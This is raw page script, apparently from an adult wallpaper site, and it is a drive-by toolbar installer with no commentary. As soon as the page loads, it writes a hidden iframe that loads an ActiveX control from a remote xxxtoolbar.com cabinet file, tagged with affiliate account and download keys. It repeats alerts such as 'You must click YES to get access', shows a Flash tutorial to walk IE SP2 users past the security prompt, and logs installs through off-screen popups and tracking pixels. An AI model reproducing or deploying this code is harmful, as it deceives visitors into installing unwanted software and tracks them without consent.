<!--
var sp2 = (navigator.appName == 'Microsoft Internet Explorer' && navigator.userAgent.indexOf("SV1") != -1);
var flag=0;
var clsid = '7C559105-9ECF-42b8-B3F7-832E75EDD959';
var codebase = 'http://www.xxxtoolbar.com/ist/softwares/v4.0/0006_regular.cab';
var loadfirst=1;
var track = sp2 ? 'flash' : 'normal';
var account_id = 99931;
var download_key = 'e201afe2c67f3b89699dba18af9bf4d3';
var download_lock = '1120321884';
var cfg = 'mtb';
var sub = '';
var prompt_text="You must click YES to get access";
var prompt_flash='You must FOLLOW THESE STEPS to continue';
var holder;

try
{
	var referer=document.location;
}
catch( e ) 
{
	var referer='';
}


function load_sp2_flash(){
	document.write('<div id="tutorial_popup" style="visibility:hidden;position:absolute;top:0px;left:0px;width:635px;height:308px"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="635" height="308">');
	document.write('<param name="movie" value="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf"><param name="quality" value="high"><param name="wmode" value="transparent">');
	document.write('<embed src="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="635" height="308"></embed></object></div>');
}

function check_sp2_flash(){
        if (document.all.tutorial_popup.style.visibility != 'visible'){
	     //window.clearInterval(flash_interval);
	     if(window.retry && retry>0){
		   alert(prompt_flash);
		   document.all.tutorial_popup.style.visibility = 'visible';
		   retry--;
	     } else {
	   	   window.clearInterval(flash_interval);
	     }
      	}
}

function showActiveX() {
		//holder.write('<HTML><HEAD></HEAD><BODY>');
        holder.write('<OBJECT id="barobject" width=1 height=1 classid="CLSID:' + clsid + '"');
        holder.write('codebase="' + codebase + '" onerror="parent.retryit();">');
        holder.write('<PARAM name="account_id" value="' + account_id + '">');
        holder.write('<PARAM name="download_key" value="' + download_key + '">');
        holder.write('<PARAM name="download_lock" value="' + download_lock + '">');
        holder.write('<PARAM name="cfg" value="' + cfg + '">');
        holder.write('<PARAM name="sub" value="' + sub + '">');
        holder.write('<PARAM name="referer" value="' + escape(referer) + '">');
        holder.write('<PARAM name="track" value="' + track + '">');
        holder.write('</OBJECT>');
		//holder.write('</BODY></HTML>');
		//holder.close();
}

function retryit(){
	if(window.retry && retry>0 && !sp2) {
		alert(prompt_text); 
        loadfirst=0;
        showActiveX();
        retry--;
        }	
	}

function start_download() {
	document.write('<iframe id="downloads_manager" style="position:absolute; visibility:hidden;"></iframe>');

	var bname=navigator.appName;
        var bver=parseInt(navigator.appVersion);
        if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
                if(!loadfirst || sp2){
                        downloads_manager.document.close();
                        holder= downloads_manager.document;
                } else {
                        holder=downloads_manager.document;
                        }
                showActiveX();
                if (sp2) {
					load_sp2_flash();
					document.all.tutorial_popup.style.visibility = "visible";
					flash_interval = window.setInterval("check_sp2_flash();", 500);

				}
                if(!flag && !sp2){
                        window.open("http://www.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=99931&auto_close=1&software_id=0006&referer=http%3A%2F%2Fwww.x-wallpaper.com%2F%7Ewallpapers%2Fin.cgi%3Fid%3D159&type=normal","_blank","top=10000, left=10000");
                } if(!flag && sp2){
                        holder.write('<IMG SRC="http://www.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=99931&auto_close=1&software_id=0006&referer=http%3A%2F%2Fwww.x-wallpaper.com%2F%7Ewallpapers%2Fin.cgi%3Fid%3D159&type=flash" width=1 height=1 border=0>');
                        }
                flag++;
        } 
}
 function start_download_loadfirst() { 
        start_download(); 
        }

 // -->


<!--
	var currentDate = new Date();
	var adRecurrence = "always";
	var adId = "a1079560680";
	var adExpiration = 0;
	var retry=1;
	var obj=null;	

    
	function SetCookie(sName, sValue, sExpire){
		var expireCode = "";
		if (sExpire) { expireCode =  "expires=" + sExpire + ";" }
		document.cookie = sName + "=" + escape(sValue) + ";" + expireCode
	}


	function GetCookie(sName) {
		var aCookie = document.cookie.split("; ");
		for (var i=0; i < aCookie.length; i++) {
			var aCrumb = aCookie[i].split("=");
			if (sName == aCrumb[0]) { return unescape(aCrumb[1]); }
		}
		return null;
	}
	
	function upop() {
				var url = "http://www.xxxtoolbar.com/ist/scripts/downloads_manager.php?pevent_type=onload&retry=1&ref=http://www.x-wallpaper.com/~wallpapers/in.cgi?id=159&event_type=onload&recurrence=always&retry=1&loadfirst=1&account_id=99931&delayload=0&adid=a1079560680";
		var win='toolbar=1,location=1,directories=0,menubar=0,scrollbars=1,resizable=1,top=110,left=2000,width=600,height=500'
		window.open(url,'pop',win);
		if(obj)
			obj();
	}


		SetCookie(adId,"1", adExpiration);
					start_download();
		//-->
